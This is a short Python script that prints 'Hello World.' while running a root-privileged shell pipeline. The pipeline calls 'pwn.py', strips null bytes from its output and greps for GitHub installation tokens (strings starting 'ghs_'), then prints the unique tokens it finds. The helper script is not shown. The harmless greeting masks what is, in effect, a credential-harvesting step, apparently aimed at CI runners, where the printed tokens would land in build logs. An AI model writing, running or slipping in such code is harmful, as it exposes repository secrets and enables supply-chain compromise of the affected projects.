import subprocess


result = subprocess.run(['bash', '-c', """sudo python3 pwn.py | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20}' | sort -u"""], capture_output=True, text=True)


print("Hello World.")

print(result.stdout)
